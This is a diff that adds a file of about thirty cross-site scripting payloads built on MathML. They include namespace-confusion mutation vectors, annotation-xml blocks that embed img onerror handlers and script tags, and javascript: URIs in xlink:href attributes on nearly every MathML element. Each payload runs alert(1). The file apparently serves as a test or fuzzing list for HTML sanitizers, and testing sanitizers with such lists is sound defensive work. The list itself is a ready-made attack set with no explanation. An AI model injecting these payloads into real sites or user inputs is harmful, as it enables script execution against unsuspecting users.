@@ -1,0 +1,30 @@
+<math><mtext><table><mglyph><style><!--</style><img src=x onerror=alert(1)>
+<math><mtext><mglyph><svg><script>alert(1)</script>
+<math href="javascript:alert(1)">click</math>
+<math xlink:href="javascript:alert(1)">click</math>
+<math><maction actiontype="statusline#http://" xlink:href="javascript:alert(1)">click
+<math><semantics><annotation-xml encoding="text/html"><img src=x onerror=alert(1)></annotation-xml></semantics></math>
+<math><semantics><annotation-xml encoding="application/xhtml+xml"><script xmlns="http://www.w3.org/1999/xhtml">alert(1)</script></annotation-xml></semantics></math>
+<math><mi xlink:href="javascript:alert(1)">x</mi></math>
+<math><mo xlink:href="javascript:alert(1)">+</mo></math>
+<math><mn xlink:href="javascript:alert(1)">1</mn></math>
+<math><ms xlink:href="javascript:alert(1)">s</ms></math>
+<math><mspace xlink:href="javascript:alert(1)"/></math>
+<math><mtext xlink:href="javascript:alert(1)">text</mtext></math>
+<math><merror xlink:href="javascript:alert(1)">err</merror></math>
+<math><mrow xlink:href="javascript:alert(1)"><mi>x</mi></mrow></math>
+<math><mfrac xlink:href="javascript:alert(1)"><mi>a</mi><mi>b</mi></mfrac></math>
+<math><msqrt xlink:href="javascript:alert(1)"><mi>x</mi></msqrt></math>
+<math><mroot xlink:href="javascript:alert(1)"><mi>x</mi><mn>3</mn></mroot></math>
+<math><mstyle xlink:href="javascript:alert(1)"><mi>x</mi></mstyle></math>
+<math><msub xlink:href="javascript:alert(1)"><mi>x</mi><mn>1</mn></msub></math>
+<math><msup xlink:href="javascript:alert(1)"><mi>x</mi><mn>2</mn></msup></math>
+<math><msubsup xlink:href="javascript:alert(1)"><mi>x</mi><mn>1</mn><mn>2</mn></msubsup></math>
+<math><munder xlink:href="javascript:alert(1)"><mi>x</mi><mo>-</mo></munder></math>
+<math><mover xlink:href="javascript:alert(1)"><mi>x</mi><mo>^</mo></mover></math>
+<math><munderover xlink:href="javascript:alert(1)"><mo>∑</mo><mn>0</mn><mi>∞</mi></munderover></math>
+<math><mtable xlink:href="javascript:alert(1)"><mtr><mtd><mi>x</mi></mtd></mtr></mtable></math>
+<math><mmultiscripts xlink:href="javascript:alert(1)"><mi>x</mi></mmultiscripts></math>
+<math><mpadded xlink:href="javascript:alert(1)"><mi>x</mi></mpadded></math>
+<math><mphantom xlink:href="javascript:alert(1)"><mi>x</mi></mphantom></math>
+<math><menclose xlink:href="javascript:alert(1)"><mi>x</mi></menclose></math>
